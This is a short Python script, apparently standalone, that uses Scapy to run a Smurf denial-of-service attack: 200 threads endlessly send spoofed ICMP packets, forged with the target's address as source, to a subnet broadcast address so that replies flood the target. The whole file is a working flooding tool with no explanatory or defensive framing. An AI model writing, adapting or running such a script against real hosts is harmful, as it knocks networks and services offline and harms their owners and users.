from scapy.all import *
from time import sleep
import _thread

 
target = '192.168.113.100'
threadnum = 200

def smurf(target):
 
    while True:
        send(IP(src=target, dst="192.168.113.255")/ICMP(), count=100, verbose=0)

def attack(target):
 
    print ("Start Attack...")
 
    for i in range(threadnum):
        _thread.start_new_thread(smurf, (target, ))
    while True:
        sleep(1)

attack(target)